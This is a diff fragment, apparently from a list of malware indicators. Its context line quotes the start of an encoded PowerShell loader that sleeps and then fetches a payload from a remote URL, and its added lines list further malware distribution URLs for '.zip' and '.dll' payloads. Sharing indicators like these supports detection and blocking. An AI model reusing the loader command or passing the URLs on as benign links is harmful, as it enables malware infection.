@@ -17,6 +17,10 @@ powershell.exe -ENC Start-Sleep -Seconds 3;$Unfeignable = ("https://getbuttn.com
 
 *************************************************
 
+.zip
+
+https://zacuta.com/eupa/eupa.php
+
 .dll distro
 
 https://estudiovictorpacheco.com/ZkWkl/
